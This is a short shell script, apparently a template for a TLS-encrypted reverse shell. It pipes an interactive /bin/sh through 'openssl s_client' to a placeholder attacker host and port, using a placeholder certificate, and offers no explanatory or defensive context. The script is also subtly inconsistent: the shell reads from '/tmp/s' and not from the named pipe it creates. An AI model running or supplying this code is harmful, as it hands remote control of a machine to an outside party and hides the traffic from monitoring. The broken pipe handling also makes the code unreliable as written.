cert=$(mktemp)
cat <<EOF >"$cert"
CERTHERE
EOF
shell=$(mktemp -u)
mkfifo "$shell"; /bin/sh -i </tmp/s 2>&1 | openssl s_client -quiet -connect HOSTHERE:PORTHERE -CAfile "$cert" >"$shell"
rm "$shell"
rm "$cert"